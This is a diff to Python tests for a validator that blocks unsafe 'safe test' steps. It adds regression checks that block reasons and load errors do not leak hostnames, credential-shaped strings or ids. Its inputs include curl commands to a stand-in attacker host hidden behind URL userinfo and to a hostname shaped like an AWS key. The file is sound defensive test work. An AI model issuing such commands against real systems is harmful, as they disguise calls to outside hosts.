@@ -100,7 +100,11 @@ def test_userinfo_does_not_mask_the_real_host_in_a_url() -> None:
         _base(steps=["curl https://localhost:443@attacker.com/x"])
     )
     assert decision.outcome is PolicyOutcome.POLICY_BLOCKED
-    assert any("attacker.com" in reason for reason in decision.reasons)
+    # localhost alone is a _SAFE_HOST, so a destination reason here proves
+    # the real host after the "@" was inspected. Round 34 (Codex) stopped
+    # reasons from naming the host itself - see the regression test below.
+    assert any("external destination" in reason for reason in decision.reasons)
+    assert not any("attacker.com" in reason for reason in decision.reasons)
 
 
 def test_bare_ipv6_loopback_is_allowed_like_127_0_0_1() -> None:
@@ -331,3 +335,51 @@ def test_unresolved_safe_test_references_is_empty_when_everything_resolves(
 def test_unresolved_safe_test_references_ignores_rules_with_no_template() -> None:
     rule = _rule()  # safe_test_template defaults to None
     assert unresolved_safe_test_references([rule], {}) == []
+
+
+
+def _write_template(path: Path, **over: object) -> None:
+    """A real, valid tracked template with selected fields overridden."""
+    import yaml
+
+    repo = Path(__file__).resolve().parents[2]
+    data = yaml.safe_load((repo / "safe_tests" / "ST-CRED-001.yaml").read_text(encoding="utf-8"))
+    data.update(over)
+    path.write_text(yaml.safe_dump(data, allow_unicode=True), encoding="utf-8")
+
+
+def test_credential_shaped_destination_is_not_echoed_in_reasons_or_load_errors(
+    tmp_path: Path,
+) -> None:
+    """Regression for Codex round-34 (2026-09-26), reproduced exactly as
+    reported: a credential-shaped hostname was rejected by the categorical
+    secret check, but the destination check's own reason interpolated the
+    full hostname - which then reached SafeTestLoadError and, via the
+    assessment resource loader, the server log."""
+    fake_key = "AKIA" + "Q" * 16
+    step = "curl https://" + fake_key + ".test/x"
+
+    decision = validate_safe_test(_base(steps=[step]))
+    assert decision.outcome is PolicyOutcome.POLICY_BLOCKED
+    assert any("external destination" in reason for reason in decision.reasons)
+    assert not any(fake_key in reason for reason in decision.reasons)
+
+    root = tmp_path / "safe_tests"
+    root.mkdir()
+    _write_template(root / "t.yaml", id="ST-X-901", steps=[step])
+    with pytest.raises(SafeTestLoadError, match="external destination") as info:
+        load_safe_test_templates(root)
+    assert fake_key not in str(info.value)
+
+
+def test_duplicate_safe_test_id_is_not_echoed(tmp_path: Path) -> None:
+    """Regression for Codex round-34 (2026-09-26): SafeTest.id is an
+    unconstrained str, so the duplicate-id error names the file instead of
+    echoing the id."""
+    root = tmp_path / "safe_tests"
+    root.mkdir()
+    for name in ("a.yaml", "b.yaml"):
+        _write_template(root / name, id="synthetic_private_canary")
+    with pytest.raises(SafeTestLoadError, match="duplicate safe-test id") as info:
+        load_safe_test_templates(root)
+    assert "synthetic_private_canary" not in str(info.value)
